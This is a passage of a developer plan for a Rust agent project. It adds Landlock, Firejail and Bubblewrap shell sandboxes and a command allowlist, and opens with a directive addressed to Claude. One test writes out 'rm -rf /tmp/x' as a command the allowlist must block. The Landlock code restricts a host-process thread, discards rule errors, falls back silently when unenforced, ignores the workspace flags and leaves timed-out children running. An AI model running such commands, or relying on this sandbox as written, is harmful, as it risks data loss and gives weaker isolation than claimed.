# Linux Sandbox Runtimes Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Add Landlock, Firejail, and Bubblewrap as optional, configurable `RuntimeType` variants for Linux shell sandboxing, plus a command allowlist mode.

**Architecture:** Three new runtime structs in `src/runtime/` each implementing the existing `ContainerRuntime` trait, gated behind Cargo features (`sandbox-landlock`, `sandbox-firejail`, `sandbox-bubblewrap`) and `#[cfg(target_os = "linux")]`. A `ShellAllowlistMode` enum is added to `ShellSecurityConfig` to complement the existing blocklist with an optional allowlist.

**Tech Stack:** Rust, Tokio async, `landlock = "0.4.4"` crate (Landlock only), existing `ContainerRuntime` trait, existing `ShellSecurityConfig`.

---

## Worktree Setup

```bash
cd /Users/dr.noranizaahmad/ios/zeptoclaw
git pull origin main
git worktree add .worktrees/linux-sandbox -b feat/linux-sandbox
cd .worktrees/linux-sandbox
```

All subsequent steps run inside `.worktrees/linux-sandbox`.

---

## Task 1: Cargo features + landlock dependency

**Files:**
- Modify: `Cargo.toml`

**Step 1: Add features and optional dep**

In `Cargo.toml`, find the `[features]` section (line ~181) and add after the `android` feature:

```toml
# Linux sandbox runtimes (Linux-only, require respective binaries except landlock)
sandbox-landlock   = ["dep:landlock"]
sandbox-firejail   = []
sandbox-bubblewrap = []
```

In the `[dependencies]` section, add after the `quick-xml` optional dep:

```toml
# Linux Landlock LSM sandbox (kernel 5.13+)
landlock = { version = "0.4.4", optional = true }
```

**Step 2: Verify it compiles**

```bash
cargo check 2>&1 | tail -5
```
Expected: no errors.

```bash
cargo check --features sandbox-landlock 2>&1 | tail -5
```
Expected: no errors.

**Step 3: Commit**

```bash
git add Cargo.toml Cargo.lock
git commit -m "chore: add sandbox-landlock/firejail/bubblewrap Cargo features"
```

---

## Task 2: Config types — three new sandbox config structs + RuntimeType variants

**Files:**
- Modify: `src/config/types.rs`

**Step 1: Write tests for new config defaults**

Find the `RuntimeConfig` test block in `src/config/types.rs` (search for `#[cfg(test)]` near `RuntimeConfig`). Add:

```rust
#[test]
fn test_landlock_config_default_read_dirs() {
    let cfg = LandlockConfig::default();
    assert!(cfg.fs_read_dirs.iter().any(|d| d == "/usr"));
    assert!(cfg.allow_read_workspace);
    assert!(cfg.allow_write_workspace);
}

#[test]
fn test_firejail_config_default_no_profile() {
    let cfg = FirejailConfig::default();
    assert!(cfg.profile.is_none());
    assert!(cfg.extra_args.is_empty());
}

#[test]
fn test_bubblewrap_config_default_ro_binds() {
    let cfg = BubblewrapConfig::default();
    assert!(cfg.ro_binds.iter().any(|d| d == "/usr"));
    assert!(cfg.dev_bind);
    assert!(cfg.proc_bind);
}

#[test]
fn test_runtime_config_has_sandbox_fields() {
    let cfg = RuntimeConfig::default();
    assert!(cfg.landlock.fs_read_dirs.contains(&"/usr".to_string()));
    assert!(cfg.firejail.profile.is_none());
    assert!(cfg.bubblewrap.dev_bind);
}
```

**Step 2: Run tests to verify they fail**

```bash
cargo test --lib test_landlock_config_default 2>&1 | tail -10
```
Expected: compile error — `LandlockConfig` not found yet.

**Step 3: Add RuntimeType variants**

Find `pub enum RuntimeType` (~line 1575) and add variants after `AppleContainer`:

```rust
    /// Landlock kernel LSM sandbox (Linux only, requires kernel 5.13+)
    #[cfg(target_os = "linux")]
    Landlock,
    /// Firejail userspace sandbox (Linux only, requires firejail binary)
    #[cfg(target_os = "linux")]
    Firejail,
    /// Bubblewrap OCI sandbox (Linux only, requires bwrap binary)
    #[cfg(target_os = "linux")]
    Bubblewrap,
```

**Step 4: Add three config structs**

After `AppleContainerConfig` (after line ~1690), add:

```rust
// ============================================================================
// Linux Sandbox Runtime Configuration
// ============================================================================

/// Landlock LSM sandbox configuration (Linux only).
///
/// Restricts filesystem access at the kernel level using the Landlock LSM.
/// Requires Linux kernel 5.13+. Degrades gracefully on older kernels.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct LandlockConfig {
    /// Directories the sandboxed process may read (recursive).
    pub fs_read_dirs: Vec<String>,
    /// Directories the sandboxed process may write (recursive).
    pub fs_write_dirs: Vec<String>,
    /// Automatically add the agent workspace to the read allow list.
    pub allow_read_workspace: bool,
    /// Automatically add the agent workspace to the write allow list.
    pub allow_write_workspace: bool,
}

impl Default for LandlockConfig {
    fn default() -> Self {
        Self {
            fs_read_dirs: vec![
                "/usr".to_string(),
                "/lib".to_string(),
                "/lib64".to_string(),
                "/etc".to_string(),
                "/bin".to_string(),
                "/sbin".to_string(),
                "/tmp".to_string(),
            ],
            fs_write_dirs: vec!["/tmp".to_string()],
            allow_read_workspace: true,
            allow_write_workspace: true,
        }
    }
}

/// Firejail sandbox configuration (Linux only).
///
/// Wraps commands with `firejail` using Linux namespaces + seccomp.
/// Requires the `firejail` binary on PATH.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(default)]
pub struct FirejailConfig {
    /// Path to a custom firejail profile file.
    /// When None, `--noprofile` is used (default restrictive firejail behaviour).
    pub profile: Option<String>,
    /// Extra arguments passed verbatim to firejail before the command.
    pub extra_args: Vec<String>,
}

/// Bubblewrap sandbox configuration (Linux only).
///
/// Wraps commands with `bwrap` (bubblewrap), a lightweight OCI-compatible sandbox.
/// Requires the `bwrap` binary on PATH.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct BubblewrapConfig {
    /// Read-only bind mounts (each entry is a host path bound at the same container path).
    pub ro_binds: Vec<String>,
    /// Bind /dev into the sandbox (needed for most commands).
    pub dev_bind: bool,
    /// Bind /proc into the sandbox.
    pub proc_bind: bool,
    /// Extra arguments passed verbatim to bwrap before the command.
    pub extra_args: Vec<String>,
}

impl Default for BubblewrapConfig {
    fn default() -> Self {
        Self {
            ro_binds: vec![
                "/usr".to_string(),
                "/lib".to_string(),
                "/lib64".to_string(),
                "/etc".to_string(),
                "/bin".to_string(),
                "/sbin".to_string(),
            ],
            dev_bind: true,
            proc_bind: true,
            extra_args: vec![],
        }
    }
}
```

**Step 5: Add fields to RuntimeConfig**

Find `pub struct RuntimeConfig` and add three fields after `apple: AppleContainerConfig`:

```rust
    /// Landlock sandbox configuration (Linux only).
    pub landlock: LandlockConfig,
    /// Firejail sandbox configuration (Linux only).
    pub firejail: FirejailConfig,
    /// Bubblewrap sandbox configuration (Linux only).
    pub bubblewrap: BubblewrapConfig,
```

Update `RuntimeConfig::default()` to include:

```rust
    landlock: LandlockConfig::default(),
    firejail: FirejailConfig::default(),
    bubblewrap: BubblewrapConfig::default(),
```

**Step 6: Run tests**

```bash
cargo test --lib test_landlock_config_default test_firejail_config_default test_bubblewrap_config_default test_runtime_config_has_sandbox_fields 2>&1 | tail -15
```
Expected: 4 tests pass.

**Step 7: Commit**

```bash
git add src/config/types.rs
git commit -m "feat: add LandlockConfig, FirejailConfig, BubblewrapConfig to RuntimeConfig"
```

---

## Task 3: LandlockRuntime

**Files:**
- Create: `src/runtime/landlock.rs`

**Step 1: Write failing tests**

Create `src/runtime/landlock.rs` with tests only first:

```rust
//! Landlock LSM sandbox runtime (Linux only).
//!
//! Uses the `landlock` crate to apply kernel-level filesystem access rules
//! before spawning shell commands. Requires Linux kernel 5.13+.
//! Degrades gracefully on older kernels via ABI negotiation in the crate.

#[cfg(test)]
mod tests {
    #[test]
    fn test_landlock_runtime_name() {
        use super::LandlockRuntime;
        use crate::config::LandlockConfig;
        let rt = LandlockRuntime::new(LandlockConfig::default());
        assert_eq!(rt.name(), "landlock");
    }

    #[tokio::test]
    async fn test_landlock_runtime_always_available() {
        use super::LandlockRuntime;
        use crate::config::LandlockConfig;
        // is_available() returns true — kernel compat handled at exec time
        let rt = LandlockRuntime::new(LandlockConfig::default());
        assert!(rt.is_available().await);
    }

    #[tokio::test]
    async fn test_landlock_runtime_echo() {
        use super::LandlockRuntime;
        use crate::config::LandlockConfig;
        use crate::runtime::ContainerConfig;
        let rt = LandlockRuntime::new(LandlockConfig::default());
        let cfg = ContainerConfig::new();
        let out = rt.execute("echo hello", &cfg).await.unwrap();
        assert!(out.success());
        assert_eq!(out.stdout.trim(), "hello");
    }

    #[tokio::test]
    async fn test_landlock_runtime_timeout() {
        use super::LandlockRuntime;
        use crate::config::LandlockConfig;
        use crate::runtime::{ContainerConfig, RuntimeError};
        let rt = LandlockRuntime::new(LandlockConfig::default());
        let cfg = ContainerConfig::new().with_timeout(1);
        let result = rt.execute("sleep 10", &cfg).await;
        assert!(matches!(result, Err(RuntimeError::Timeout(1))));
    }
}
```

**Step 2: Run to confirm compile failure**

```bash
cargo test --lib --features sandbox-landlock 2>&1 | grep "error\|cannot find" | head -5
```
Expected: `error[E0433]: failed to resolve: use of undeclared crate or module 'super'`.

**Step 3: Implement LandlockRuntime**

Replace the file with the full implementation:

```rust
//! Landlock LSM sandbox runtime (Linux only).

#[cfg(all(target_os = "linux", feature = "sandbox-landlock"))]
use landlock::{
    Access, AccessFs, PathBeneath, PathFd, Ruleset, RulesetAttr, RulesetCreatedAttr,
    RulesetError, RulesetStatus, ABI,
};

use async_trait::async_trait;
use std::path::PathBuf;
use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;

use crate::config::LandlockConfig;
use crate::runtime::types::{CommandOutput, ContainerConfig, ContainerRuntime, RuntimeError, RuntimeResult};

/// Landlock LSM sandbox runtime.
///
/// Applies kernel-level filesystem access restrictions using the Linux Landlock LSM.
/// Requires Linux 5.13+; gracefully degrades on older kernels (ABI negotiation).
pub struct LandlockRuntime {
    config: LandlockConfig,
}

impl LandlockRuntime {
    pub fn new(config: LandlockConfig) -> Self {
        Self { config }
    }
}

#[async_trait]
impl ContainerRuntime for LandlockRuntime {
    fn name(&self) -> &str {
        "landlock"
    }

    /// Always returns true — availability is runtime-checked at exec time.
    async fn is_available(&self) -> bool {
        true
    }

    async fn execute(&self, command: &str, config: &ContainerConfig) -> RuntimeResult<CommandOutput> {
        let config = config.clone();
        let ll_config = self.config.clone();
        let command = command.to_string();

        // Run in a blocking thread — Landlock pre_exec requires std process
        let result = tokio::task::spawn_blocking(move || {
            execute_with_landlock(&command, &config, &ll_config)
        })
        .await
        .map_err(|e| RuntimeError::ExecutionFailed(e.to_string()))?;

        result
    }
}

fn execute_with_landlock(
    command: &str,
    config: &ContainerConfig,
    ll_config: &LandlockConfig,
) -> RuntimeResult<CommandOutput> {
    use std::process::Command as StdCommand;

    #[cfg(all(target_os = "linux", feature = "sandbox-landlock"))]
    {
        apply_landlock_rules(ll_config)?;
    }
    #[cfg(not(all(target_os = "linux", feature = "sandbox-landlock")))]
    {
        let _ = ll_config;
        return Err(RuntimeError::NotAvailable(
            "Recompile with --features sandbox-landlock to use the Landlock runtime.".to_string(),
        ));
    }

    let mut cmd = StdCommand::new("sh");
    cmd.arg("-c").arg(command);
    cmd.stdout(Stdio::piped()).stderr(Stdio::piped());

    if let Some(ref workdir) = config.workdir {
        cmd.current_dir(workdir);
    }
    for (k, v) in &config.env {
        cmd.env(k, v);
    }

    // Timeout via std::thread + channel
    let timeout = Duration::from_secs(config.timeout_secs);
    let (tx, rx) = std::sync::mpsc::channel();
    let mut child = cmd
        .spawn()
        .map_err(|e| RuntimeError::ExecutionFailed(e.to_string()))?;

    let handle = std::thread::spawn(move || {
        let out = child.wait_with_output();
        let _ = tx.send(out);
    });

    match rx.recv_timeout(timeout) {
        Ok(Ok(output)) => {
            let _ = handle.join();
            Ok(CommandOutput::new(
                String::from_utf8_lossy(&output.stdout).to_string(),
                String::from_utf8_lossy(&output.stderr).to_string(),
                output.status.code(),
            ))
        }
        Ok(Err(e)) => Err(RuntimeError::ExecutionFailed(e.to_string())),
        Err(_) => Err(RuntimeError::Timeout(config.timeout_secs)),
    }
}

#[cfg(all(target_os = "linux", feature = "sandbox-landlock"))]
fn apply_landlock_rules(config: &LandlockConfig) -> RuntimeResult<()> {
    use std::os::unix::io::AsFd;

    let abi = ABI::V3;
    let mut ruleset = Ruleset::default()
        .handle_access(AccessFs::from_read(abi))
        .map_err(landlock_err)?
        .handle_access(AccessFs::from_write(abi))
        .map_err(landlock_err)?
        .create()
        .map_err(landlock_err)?;

    for dir in &config.fs_read_dirs {
        if let Ok(fd) = PathFd::new(dir) {
            let _ = ruleset.add_rule(
                PathBeneath::new(fd, AccessFs::from_read(abi))
            );
        }
    }

    for dir in &config.fs_write_dirs {
        if let Ok(fd) = PathFd::new(dir) {
            let _ = ruleset.add_rule(
                PathBeneath::new(fd, AccessFs::from_all(abi))
            );
        }
    }

    match ruleset.restrict_self() {
        Ok(status) => {
            if status.ruleset == RulesetStatus::NotEnforced {
                tracing::warn!("Landlock not enforced (kernel < 5.13) — falling back to native execution");
            }
            Ok(())
        }
        Err(e) => Err(RuntimeError::ExecutionFailed(format!("Landlock restrict_self failed: {}", e))),
    }
}

#[cfg(all(target_os = "linux", feature = "sandbox-landlock"))]
fn landlock_err(e: impl std::fmt::Display) -> RuntimeError {
    RuntimeError::ExecutionFailed(format!("Landlock ruleset error: {}", e))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::LandlockConfig;
    use crate::runtime::types::ContainerConfig;

    #[test]
    fn test_landlock_runtime_name() {
        let rt = LandlockRuntime::new(LandlockConfig::default());
        assert_eq!(rt.name(), "landlock");
    }

    #[tokio::test]
    async fn test_landlock_runtime_always_available() {
        let rt = LandlockRuntime::new(LandlockConfig::default());
        assert!(rt.is_available().await);
    }

    #[cfg(all(target_os = "linux", feature = "sandbox-landlock"))]
    #[tokio::test]
    async fn test_landlock_runtime_echo() {
        let rt = LandlockRuntime::new(LandlockConfig::default());
        let cfg = ContainerConfig::new();
        let out = rt.execute("echo hello", &cfg).await.unwrap();
        assert!(out.success());
        assert_eq!(out.stdout.trim(), "hello");
    }

    #[cfg(all(target_os = "linux", feature = "sandbox-landlock"))]
    #[tokio::test]
    async fn test_landlock_runtime_timeout() {
        let rt = LandlockRuntime::new(LandlockConfig::default());
        let cfg = ContainerConfig::new().with_timeout(1);
        let result = rt.execute("sleep 10", &cfg).await;
        assert!(matches!(result, Err(RuntimeError::Timeout(1))));
    }

    #[cfg(not(all(target_os = "linux", feature = "sandbox-landlock")))]
    #[tokio::test]
    async fn test_landlock_runtime_unavailable_without_feature() {
        let rt = LandlockRuntime::new(LandlockConfig::default());
        let cfg = ContainerConfig::new();
        let result = rt.execute("echo hi", &cfg).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("sandbox-landlock"));
    }
}
```

**Step 4: Run tests**

```bash
cargo test --lib --features sandbox-landlock 2>&1 | grep -E "test_landlock|FAILED|ok" | head -10
```
Expected: `test_landlock_runtime_name ... ok`, `test_landlock_runtime_always_available ... ok`.

The `echo` and `timeout` tests run on Linux only — they'll be ignored on macOS.

**Step 5: Commit**

```bash
git add src/runtime/landlock.rs
git commit -m "feat: add LandlockRuntime (Linux kernel LSM sandbox)"
```

---

## Task 4: FirejailRuntime

**Files:**
- Create: `src/runtime/firejail.rs`

**Step 1: Write the file with tests + implementation**

```rust
//! Firejail sandbox runtime (Linux only).
//!
//! Wraps shell commands with `firejail` using Linux namespaces and seccomp.
//! Requires the `firejail` binary on PATH.

use async_trait::async_trait;
use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;

use crate::config::FirejailConfig;
use crate::runtime::types::{CommandOutput, ContainerConfig, ContainerRuntime, RuntimeError, RuntimeResult};

/// Firejail sandbox runtime.
pub struct FirejailRuntime {
    config: FirejailConfig,
}

impl FirejailRuntime {
    pub fn new(config: FirejailConfig) -> Self {
        Self { config }
    }

    /// Build the firejail argument list for a given command.
    pub fn build_args(&self, command: &str) -> Vec<String> {
        let mut args: Vec<String> = Vec::new();

        match &self.config.profile {
            Some(p) => args.push(format!("--profile={}", p)),
            None => args.push("--noprofile".to_string()),
        }

        for extra in &self.config.extra_args {
            args.push(extra.clone());
        }

        args.push("--".to_string());
        args.push("sh".to_string());
        args.push("-c".to_string());
        args.push(command.to_string());
        args
    }
}

#[async_trait]
impl ContainerRuntime for FirejailRuntime {
    fn name(&self) -> &str {
        "firejail"
    }

    async fn is_available(&self) -> bool {
        #[cfg(feature = "sandbox-firejail")]
        {
            Command::new("which")
                .arg("firejail")
                .output()
                .await
                .map(|o| o.status.success())
                .unwrap_or(false)
        }
        #[cfg(not(feature = "sandbox-firejail"))]
        false
    }

    async fn execute(&self, command: &str, config: &ContainerConfig) -> RuntimeResult<CommandOutput> {
        #[cfg(not(feature = "sandbox-firejail"))]
        return Err(RuntimeError::NotAvailable(
            "Recompile with --features sandbox-firejail to use the Firejail runtime.".to_string(),
        ));

        #[cfg(feature = "sandbox-firejail")]
        {
            let args = self.build_args(command);
            let mut cmd = Command::new("firejail");
            for arg in &args {
                cmd.arg(arg);
            }
            cmd.stdout(Stdio::piped()).stderr(Stdio::piped());

            if let Some(ref workdir) = config.workdir {
                cmd.current_dir(workdir);
            }
            for (k, v) in &config.env {
                cmd.env(k, v);
            }

            let output = tokio::time::timeout(
                Duration::from_secs(config.timeout_secs),
                cmd.output(),
            )
            .await
            .map_err(|_| RuntimeError::Timeout(config.timeout_secs))?
            .map_err(|e| RuntimeError::ExecutionFailed(e.to_string()))?;

            Ok(CommandOutput::new(
                String::from_utf8_lossy(&output.stdout).to_string(),
                String::from_utf8_lossy(&output.stderr).to_string(),
                output.status.code(),
            ))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::FirejailConfig;

    #[test]
    fn test_firejail_runtime_name() {
        let rt = FirejailRuntime::new(FirejailConfig::default());
        assert_eq!(rt.name(), "firejail");
    }

    #[test]
    fn test_firejail_build_args_no_profile() {
        let rt = FirejailRuntime::new(FirejailConfig::default());
        let args = rt.build_args("echo hello");
        assert!(args.contains(&"--noprofile".to_string()));
        assert!(args.contains(&"echo hello".to_string()));
        assert!(args.contains(&"sh".to_string()));
    }

    #[test]
    fn test_firejail_build_args_with_profile() {
        let rt = FirejailRuntime::new(FirejailConfig {
            profile: Some("/etc/firejail/default.profile".to_string()),
            extra_args: vec![],
        });
        let args = rt.build_args("ls");
        assert!(args.iter().any(|a| a.contains("profile")));
        assert!(!args.contains(&"--noprofile".to_string()));
    }

    #[test]
    fn test_firejail_build_args_extra_args() {
        let rt = FirejailRuntime::new(FirejailConfig {
            profile: None,
            extra_args: vec!["--net=none".to_string()],
        });
        let args = rt.build_args("ls");
        assert!(args.contains(&"--net=none".to_string()));
    }

    #[cfg(not(feature = "sandbox-firejail"))]
    #[tokio::test]
    async fn test_firejail_unavailable_without_feature() {
        let rt = FirejailRuntime::new(FirejailConfig::default());
        let cfg = crate::runtime::types::ContainerConfig::new();
        let result = rt.execute("echo hi", &cfg).await;
        assert!(result.unwrap_err().to_string().contains("sandbox-firejail"));
    }

    #[cfg(not(feature = "sandbox-firejail"))]
    #[tokio::test]
    async fn test_firejail_not_available_without_feature() {
        let rt = FirejailRuntime::new(FirejailConfig::default());
        assert!(!rt.is_available().await);
    }
}
```

**Step 2: Run tests**

```bash
cargo test --lib 2>&1 | grep "firejail" | head -10
```
Expected: all firejail tests pass.

**Step 3: Commit**

```bash
git add src/runtime/firejail.rs
git commit -m "feat: add FirejailRuntime (Linux firejail binary sandbox)"
```

---

## Task 5: BubblewrapRuntime

**Files:**
- Create: `src/runtime/bubblewrap.rs`

**Step 1: Write the file**

```rust
//! Bubblewrap (bwrap) sandbox runtime (Linux only).
//!
//! Wraps shell commands with `bwrap`, a lightweight OCI-compatible sandbox
//! used by Flatpak. Requires the `bwrap` binary on PATH.

use async_trait::async_trait;
use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;

use crate::config::BubblewrapConfig;
use crate::runtime::types::{CommandOutput, ContainerConfig, ContainerRuntime, RuntimeError, RuntimeResult};

/// Bubblewrap (bwrap) sandbox runtime.
pub struct BubblewrapRuntime {
    config: BubblewrapConfig,
}

impl BubblewrapRuntime {
    pub fn new(config: BubblewrapConfig) -> Self {
        Self { config }
    }

    /// Build the bwrap argument list for a given command and workspace.
    pub fn build_args(&self, command: &str, workspace: Option<&str>) -> Vec<String> {
        let mut args: Vec<String> = Vec::new();

        for path in &self.config.ro_binds {
            args.push("--ro-bind".to_string());
            args.push(path.clone());
            args.push(path.clone());
        }

        if self.config.dev_bind {
            args.push("--dev".to_string());
            args.push("/dev".to_string());
        }

        if self.config.proc_bind {
            args.push("--proc".to_string());
            args.push("/proc".to_string());
        }

        // Workspace gets a writable bind
        if let Some(ws) = workspace {
            args.push("--bind".to_string());
            args.push(ws.to_string());
            args.push(ws.to_string());
        }

        // /tmp always writable
        args.push("--bind".to_string());
        args.push("/tmp".to_string());
        args.push("/tmp".to_string());

        for extra in &self.config.extra_args {
            args.push(extra.clone());
        }

        args.push("sh".to_string());
        args.push("-c".to_string());
        args.push(command.to_string());
        args
    }
}

#[async_trait]
impl ContainerRuntime for BubblewrapRuntime {
    fn name(&self) -> &str {
        "bubblewrap"
    }

    async fn is_available(&self) -> bool {
        #[cfg(feature = "sandbox-bubblewrap")]
        {
            Command::new("which")
                .arg("bwrap")
                .output()
                .await
                .map(|o| o.status.success())
                .unwrap_or(false)
        }
        #[cfg(not(feature = "sandbox-bubblewrap"))]
        false
    }

    async fn execute(&self, command: &str, config: &ContainerConfig) -> RuntimeResult<CommandOutput> {
        #[cfg(not(feature = "sandbox-bubblewrap"))]
        return Err(RuntimeError::NotAvailable(
            "Recompile with --features sandbox-bubblewrap to use the Bubblewrap runtime.".to_string(),
        ));

        #[cfg(feature = "sandbox-bubblewrap")]
        {
            let workspace = config.workdir.as_ref().and_then(|p| p.to_str());
            let args = self.build_args(command, workspace);

            let mut cmd = Command::new("bwrap");
            for arg in &args {
                cmd.arg(arg);
            }
            cmd.stdout(Stdio::piped()).stderr(Stdio::piped());

            if let Some(ref workdir) = config.workdir {
                cmd.current_dir(workdir);
            }
            for (k, v) in &config.env {
                cmd.env(k, v);
            }

            let output = tokio::time::timeout(
                Duration::from_secs(config.timeout_secs),
                cmd.output(),
            )
            .await
            .map_err(|_| RuntimeError::Timeout(config.timeout_secs))?
            .map_err(|e| RuntimeError::ExecutionFailed(e.to_string()))?;

            Ok(CommandOutput::new(
                String::from_utf8_lossy(&output.stdout).to_string(),
                String::from_utf8_lossy(&output.stderr).to_string(),
                output.status.code(),
            ))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::BubblewrapConfig;

    #[test]
    fn test_bubblewrap_runtime_name() {
        let rt = BubblewrapRuntime::new(BubblewrapConfig::default());
        assert_eq!(rt.name(), "bubblewrap");
    }

    #[test]
    fn test_bubblewrap_build_args_contains_ro_binds() {
        let rt = BubblewrapRuntime::new(BubblewrapConfig::default());
        let args = rt.build_args("echo hello", None);
        assert!(args.contains(&"--ro-bind".to_string()));
        assert!(args.contains(&"/usr".to_string()));
    }

    #[test]
    fn test_bubblewrap_build_args_dev_proc() {
        let rt = BubblewrapRuntime::new(BubblewrapConfig::default());
        let args = rt.build_args("ls", None);
        assert!(args.contains(&"--dev".to_string()));
        assert!(args.contains(&"--proc".to_string()));
    }

    #[test]
    fn test_bubblewrap_build_args_workspace_bind() {
        let rt = BubblewrapRuntime::new(BubblewrapConfig::default());
        let args = rt.build_args("ls", Some("/workspace"));
        assert!(args.contains(&"--bind".to_string()));
        assert!(args.contains(&"/workspace".to_string()));
    }

    #[test]
    fn test_bubblewrap_build_args_command_at_end() {
        let rt = BubblewrapRuntime::new(BubblewrapConfig::default());
        let args = rt.build_args("my-cmd", None);
        let last = args.last().unwrap();
        assert_eq!(last, "my-cmd");
    }

    #[cfg(not(feature = "sandbox-bubblewrap"))]
    #[tokio::test]
    async fn test_bubblewrap_unavailable_without_feature() {
        let rt = BubblewrapRuntime::new(BubblewrapConfig::default());
        let cfg = crate::runtime::types::ContainerConfig::new();
        let result = rt.execute("echo hi", &cfg).await;
        assert!(result.unwrap_err().to_string().contains("sandbox-bubblewrap"));
    }

    #[cfg(not(feature = "sandbox-bubblewrap"))]
    #[tokio::test]
    async fn test_bubblewrap_not_available_without_feature() {
        let rt = BubblewrapRuntime::new(BubblewrapConfig::default());
        assert!(!rt.is_available().await);
    }
}
```

**Step 2: Run tests**

```bash
cargo test --lib 2>&1 | grep "bubblewrap" | head -10
```
Expected: all bubblewrap tests pass.

**Step 3: Commit**

```bash
git add src/runtime/bubblewrap.rs
git commit -m "feat: add BubblewrapRuntime (Linux bwrap OCI sandbox)"
```

---

## Task 6: Wire into runtime/mod.rs + factory

**Files:**
- Modify: `src/runtime/mod.rs`
- Modify: `src/runtime/factory.rs`

**Step 1: Update mod.rs exports**

Add after the `#[cfg(target_os = "macos")]` apple block:

```rust
// Linux sandbox runtimes
#[cfg(target_os = "linux")]
pub mod bubblewrap;
#[cfg(target_os = "linux")]
pub mod firejail;
#[cfg(target_os = "linux")]
pub mod landlock;

#[cfg(target_os = "linux")]
pub use bubblewrap::BubblewrapRuntime;
#[cfg(target_os = "linux")]
pub use firejail::FirejailRuntime;
#[cfg(target_os = "linux")]
pub use landlock::LandlockRuntime;
```

Update the module doc comment to list the new runtimes.

**Step 2: Update factory.rs — add match arms in create_runtime()**

Add after the `RuntimeType::AppleContainer` arm:

```rust
        #[cfg(target_os = "linux")]
        RuntimeType::Landlock => {
            let runtime = LandlockRuntime::new(config.landlock.clone());
            Ok(Arc::new(runtime))
        }

        #[cfg(target_os = "linux")]
        RuntimeType::Firejail => {
            #[cfg(not(feature = "sandbox-firejail"))]
            return Err(RuntimeError::NotAvailable(
                "Recompile with --features sandbox-firejail to use the Firejail runtime.".to_string(),
            ));
            #[cfg(feature = "sandbox-firejail")]
            {
                use super::firejail::FirejailRuntime;
                let runtime = FirejailRuntime::new(config.firejail.clone());
                if !runtime.is_available().await {
                    return Err(RuntimeError::NotAvailable(
                        "firejail binary not found on PATH. Install with: apt install firejail".to_string(),
                    ));
                }
                Ok(Arc::new(runtime))
            }
        }

        #[cfg(target_os = "linux")]
        RuntimeType::Bubblewrap => {
            #[cfg(not(feature = "sandbox-bubblewrap"))]
            return Err(RuntimeError::NotAvailable(
                "Recompile with --features sandbox-bubblewrap to use the Bubblewrap runtime.".to_string(),
            ));
            #[cfg(feature = "sandbox-bubblewrap")]
            {
                use super::bubblewrap::BubblewrapRuntime;
                let runtime = BubblewrapRuntime::new(config.bubblewrap.clone());
                if !runtime.is_available().await {
                    return Err(RuntimeError::NotAvailable(
                        "bwrap binary not found on PATH. Install with: apt install bubblewrap".to_string(),
                    ));
                }
                Ok(Arc::new(runtime))
            }
        }
```

**Step 3: Update available_runtimes() in factory.rs**

Add after the Apple block:

```rust
    // Linux sandbox runtimes
    #[cfg(all(target_os = "linux", feature = "sandbox-firejail"))]
    {
        use super::firejail::FirejailRuntime;
        use crate::config::FirejailConfig;
        if FirejailRuntime::new(FirejailConfig::default()).is_available().await {
            available.push("firejail");
        }
    }

    #[cfg(all(target_os = "linux", feature = "sandbox-bubblewrap"))]
    {
        use super::bubblewrap::BubblewrapRuntime;
        use crate::config::BubblewrapConfig;
        if BubblewrapRuntime::new(BubblewrapConfig::default()).is_available().await {
            available.push("bubblewrap");
        }
    }

    #[cfg(all(target_os = "linux", feature = "sandbox-landlock"))]
    available.push("landlock");
```

**Step 4: Add factory tests**

In factory.rs test block, add:

```rust
    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn test_create_landlock_runtime() {
        use crate::config::{RuntimeConfig, RuntimeType};
        let mut config = RuntimeConfig::default();
        config.runtime_type = RuntimeType::Landlock;
        // Always succeeds (landlock doesn't require a feature to create, only to execute)
        // With sandbox-landlock feature it returns a real runtime
        // Without the feature it will still compile but execute returns error
        // Test that factory returns Ok
        let result = create_runtime(&config).await;
        assert!(result.is_ok());
        assert_eq!(result.unwrap().name(), "landlock");
    }

    #[cfg(all(target_os = "linux", not(feature = "sandbox-firejail")))]
    #[tokio::test]
    async fn test_create_firejail_runtime_no_feature() {
        use crate::config::{RuntimeConfig, RuntimeType};
        let mut config = RuntimeConfig::default();
        config.runtime_type = RuntimeType::Firejail;
        let result = create_runtime(&config).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("sandbox-firejail"));
    }

    #[cfg(all(target_os = "linux", not(feature = "sandbox-bubblewrap")))]
    #[tokio::test]
    async fn test_create_bubblewrap_runtime_no_feature() {
        use crate::config::{RuntimeConfig, RuntimeType};
        let mut config = RuntimeConfig::default();
        config.runtime_type = RuntimeType::Bubblewrap;
        let result = create_runtime(&config).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("sandbox-bubblewrap"));
    }
```

**Step 5: Run all tests**

```bash
cargo test --lib 2>&1 | tail -10
```
Expected: all existing tests still pass; new tests pass.

**Step 6: Commit**

```bash
git add src/runtime/mod.rs src/runtime/factory.rs
git commit -m "feat: wire Landlock/Firejail/Bubblewrap into runtime factory and exports"
```

---

## Task 7: Command allowlist in ShellSecurityConfig

**Files:**
- Modify: `src/security/shell.rs`

**Step 1: Write failing tests**

Find the test block in `src/security/shell.rs` and add:

```rust
    #[test]
    fn test_allowlist_off_passes_any_command() {
        let config = ShellSecurityConfig::new()
            .with_allowlist(vec!["git".to_string()], ShellAllowlistMode::Off);
        assert!(config.validate_command("ls -la").is_ok());
        assert!(config.validate_command("python3 script.py").is_ok());
    }

    #[test]
    fn test_allowlist_strict_blocks_unlisted_command() {
        let config = ShellSecurityConfig::new()
            .with_allowlist(vec!["git".to_string(), "cargo".to_string()], ShellAllowlistMode::Strict);
        assert!(config.validate_command("git status").is_ok());
        assert!(config.validate_command("cargo build").is_ok());
        assert!(config.validate_command("rm -rf /tmp/x").is_err());
    }

    #[test]
    fn test_allowlist_warn_passes_unlisted_command() {
        let config = ShellSecurityConfig::new()
